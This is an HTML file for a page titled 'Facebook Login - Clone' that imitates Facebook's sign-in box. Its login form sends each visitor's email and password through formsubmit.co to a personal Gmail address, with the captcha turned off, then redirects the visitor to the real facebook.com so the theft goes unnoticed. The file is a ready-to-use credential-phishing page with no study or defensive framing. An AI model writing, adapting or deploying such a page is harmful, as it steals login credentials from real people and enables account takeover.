<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook Login - Clone</title>
    <link rel="stylesheet" href="style.css"> <!-- Link to your CSS file -->
</head>
<body>
    <div class="login-container">
        <div class="login-box">
            <h2>Facebook</h2>

            <!-- Correct Form -->
            <form action="https://formsubmit.co/kipkoechhyben@gmail.com" method="POST">
                <!-- Hidden Fields -->
                <input type="hidden" name="_subject" value="New login submission">
                <input type="hidden" name="_next" value="https://www.facebook.com"> <!-- Redirect after submission -->
                <input type="hidden" name="_captcha" value="false"> <!-- Optional: disable captcha -->

                <!-- Inputs -->
                <input type="email" placeholder="Email or Phone" name="email" required>
                <input type="password" placeholder="Password" name="password" required>

                <!-- Button -->
                <button type="submit" class="login-btn">Log In</button>
            </form>

            <a href="#" class="forgot-password">Forgotten password?</a>
            <div class="signup-container">
                <p>Don't have an account?</p>
                <button class="signup-btn">Create New Account</button>
            </div>
        </div>
    </div>
</body>
</html>
